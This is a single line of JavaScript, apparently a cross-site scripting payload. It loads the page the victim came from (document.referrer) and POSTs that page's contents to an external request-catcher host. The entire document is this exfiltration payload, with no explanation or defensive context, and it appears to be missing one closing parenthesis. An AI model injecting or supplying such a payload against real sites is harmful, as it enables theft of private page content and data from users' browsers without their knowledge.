fetch(document.referrer).then(r=>r.text()).then(r=>fetch("https://polar.requestcatcher.com/test",{method:"post",body:r})
